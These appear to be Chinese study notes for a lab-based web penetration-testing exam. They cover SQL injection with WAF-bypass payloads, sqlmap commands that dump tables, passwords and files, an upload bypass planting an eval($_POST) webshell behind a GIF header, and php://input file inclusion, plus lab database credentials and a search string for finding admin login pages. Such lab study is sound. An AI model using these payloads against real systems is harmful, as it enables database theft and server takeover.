上传方法：思路变通，

操作机：czj2003:d:\安全工具

sqlmap:复制到根目录

burpsuite:时间：2017.10.10

90secfirefox:hackbar:f9

网站木马\webshell:aspx一句话木马小集：.net

字典工具：password.txt:1050

御剑扫描：配置弱点

php+mysql:

php安全

一。数据库管理工具

http://192.168.2.5/phpmyadmin

保健品：

user:root

pass:php168.com

php+mysql:iis所有网站停止，开始--运行--net start apache2

二。gpc=on:php.ini

防注入：

在特殊符号前加转义字符：\

magic\_quotes\_gpc = on

http://192.168.2.5/dvbbsnews/boardrule.php?groupboardid=1

%2527

绕过：char\(97\)=a

unicode:高，低 %81'--》%81\'

\=%5c

%81%5c:unicode

三万能口令:'or'='or',闭合

select \* from admin where username=''or'='or'' and password='111111'



baidu:inurl:admin\_login.asp

四。注释符号：

mssql:--

mysql:--空格：空格编码：%20

--+

-- -

//

/\*\*/

php:\#:%23

union联合查询：跨表查询

select col1,col2,col3 from stuinfo

union

select c1,c2,c3 from teainfo



1.前后表对应列数要相同

判断前表查询列数

union select 1返回错误

union select 1,2错误

union select 1,2,3,4,5返回正常

万能匹配：null

oracle:select null,null from dual

2.如果前表出错，就会返回后表的结果

参数前加负号：-

and 1=2

3.前后表相对应列的数据类型要兼容

字典表：oracle,mysql&gt;5.0 mssql

id=-1 union select '1',2,3,4,5出错

id=-1 union select 1,'2',3,4,5出错

id=-1 union select 1,2,'3',4,5返回正常

第3列为字符类型

判断用户名：

id=-1 union select 1,2,user\(\),4,5

union判断顺序：

判断前表列数：

判断前表哪列为字符类型

判断结果：参数前加负号，and 1=2,字符类型：user\(\) database\(\)

注入工具：sqlmap:python27:

1.判断库名：article

sqlmap.py -u "注入点" --dbs

2.判断表名

sqlmap.py -u "注入点" -D article --tables

3.判断列名

sqlmap.py -u "注入点" -D article -T admin --columns



4.判断值：

sqlmap.py -u "注入点" -D article -T admin -C username,password --dump

5.判断连接数据库用户名和密码

sqlmap.py -u "注入点"  --passwords

navicat:连接数据库

6.考试题：

读文件：/tmp/360/key

sqlmap.py -u "注入点"  --file-read="/tmp/360/key"

7:waf:web app fw 穿透：软件，硬件

tamper:space2hash.py,space2plus.py

空格过滤：tab,+,/\*\*/

union:ununionion uni%%%%on

sqlmap.py -u "url" --file-read="/tmp/360/key" --tamper "space2hash.py"



读文件：load\_file\(c:\boot.ini\)

小葵多功能转换工具：c:\boot.ini转换为十六进制：0x633A5C626F6F742E696E69

第一题：sql注入：

要求：/tmp/360/key

用工具:

sqlmap.py -u "http://172.16.12.100:81/vulnerabilities/fu1.php?id=1" --file-read="/tmp/360/key" --tamper "space2hash.py"



C:\Users\Administrator\.sqlmap\output\172.16.12.100\files\

手工判断

1.判断过滤内容：空格and 1=1

过滤：空格，union

绕过：

空格：/\*\*/

union:uniunionon

2.构造闭合语句：

select \* from article where id= \('1'\)

%27\)and%23

select \* from article where id= \('1'\)and\#'\)

3.判断前表列数：

%27\)/\*\*/ununionion/\*\*/select/\*\*/1/\*\*/%23 错误



%27\)/\*\*/ununionion/\*\*/select/\*\*/1,2,3,4/\*\*/%23 正常

4.判断结果在哪列显示：

参数值前加负号

5.读key

%27\)/\*\*/ununionion/\*\*/select/\*\*/1,load\_file\("/tmp/360/key"\),3,4/\*\*/%23

环境：

1.pet-centos:172.16.12.100:81-85，网卡：NAT

2.CZJ-2003:nat

3.真机：vmnet8:自动获取

4.vmware:编辑--虚拟网络编辑--vmnet8:dhcp,

172.16.12.0

子网掩码：255.255.255.0



sqlmap.py -v 3:显示payload



第二道：上传漏洞：

不允许上传：Php,过滤一句话木马：eval,request

文件头检测：

&lt;?php eval\($\_POST\['cmd'\]\);?&gt;

1.随意在c盘搜索一个jpg\(小\)，浏览上传：uu.jpg

2.burp抓包：

a:90secfirefox代理：工具--选项--高级--网络--设置：手动代理：127.0.0.1 端口：8080

b.运行：burploader:proxy--intercpet off

不能运行：日期：2017.10.10

浏览--把uu.jpg上传

3.burp--proxy--http history:post  右键--send to repeater:

修改两个地方：uu.php3

图片末尾插入Php读文件代码：

\*必记

&lt;?php readfile\("../key.php"\);?&gt;

&lt;?php echo file\_get\_contents\("../key.php"\);?&gt;

4.点击go:

5.访问上传文件：http://172.16.12.100:82/vulnerabilities/uu.php3

右键--查年源码：

yi.jpg:

GIF98a

&lt;?php readfile\("../key.php"\);?&gt;

第三题：文件包含：php 90secfirfox:

include

require

本地包含：a.txt &lt;?php phpinfo\(\);?&gt;

第一种解法：远程包含：http://172.16.12.100:82/vulnerabilities/yi.jpg

参数file=http://172.16.12.100:82/vulnerabilities/yi.jpg

右键--查源码

第二种解法：

file=php://input

post data:勾上

&lt;?php readfile\("../key.php"\);?&gt;

&lt;?php echo file\_get\_contents\("../key.php"\);?&gt;

点击执行：

右键--查源码





